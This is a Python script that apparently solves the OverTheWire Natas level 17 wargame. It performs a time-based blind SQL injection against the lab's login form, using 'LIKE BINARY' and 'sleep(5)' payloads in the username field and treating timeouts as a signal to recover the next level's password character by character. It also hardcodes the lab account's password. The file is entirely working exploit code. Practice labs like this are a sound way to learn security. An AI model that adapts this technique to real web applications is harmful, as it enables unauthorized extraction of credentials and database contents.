#!/usr/bin/env python
import requests

possible_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
auth=('natas17', password)

used_chars = ''

for char in possible_chars:
    payload = {'username': ('natas18" AND password LIKE BINARY "%%%c%%" and sleep(5) and "1"="1' % char)}
    try:
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=auth, data=payload, timeout=1)
    except requests.exceptions.Timeout:
        used_chars += char

print used_chars

cracked_pass = ''
for i in range(32):
    print i
    for char in used_chars:
        new_pass = cracked_pass + char
        payload = {'username': ('natas18" AND password LIKE BINARY "%s%%" and sleep(5) and "1"="1' % new_pass)}
        try:
            r = requests.post(
                'http://natas17.natas.labs.overthewire.org/index.php',
                auth=auth, data=payload, timeout=1)
        except requests.exceptions.Timeout:
            cracked_pass += char
            print cracked_pass + "*" * (32 - len(cracked_pass))
            break
